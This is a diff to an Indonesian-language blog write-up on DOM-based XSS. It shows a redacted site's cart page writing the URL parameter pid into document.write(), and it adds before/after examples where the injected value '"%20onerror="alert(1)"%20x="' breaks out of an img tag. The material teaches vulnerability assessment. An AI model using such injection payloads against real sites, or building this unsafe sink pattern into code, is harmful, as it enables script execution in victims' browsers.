@@ -56,12 +56,29 @@ Pada _JavaScript_ di atas terdapat sebuah **Sink** yaitu `document.write()` yang
 | ---------------- |:-------------:|
 | document.write() | location.href |
 
-
 ### Exploitation
 ```
 https://[redacted].com/[redacted]/cart?pid="%20onerror="alert(1)"%20x="
 ```
 ![DOM Triggered](https://infosec.zerobyte.id/images/dom-xss-location-href.png)
+
+#### Before
+```
+Browse:
+/cart?pid=179273640
+
+Document:
+document.write('<img src="/images/thumb-179273640.jpeg">')
+```
+
+#### After
+```
+Browse:
+/cart?pid="%20onerror="alert(1)"%20x="
+
+Document:
+document.write('<img src="/images/thumb-" onerror="alert(1)" x=".jpeg">')
+```
 
 # EOF
 Untuk menemukan kerentanan DOM XSS sendiri sebenarnya kalian hanya perlu memperhatikan `Source` dan `Sink` yang terdapat pada JavaScript di Website yang sedang kalian lakukan Assessment.
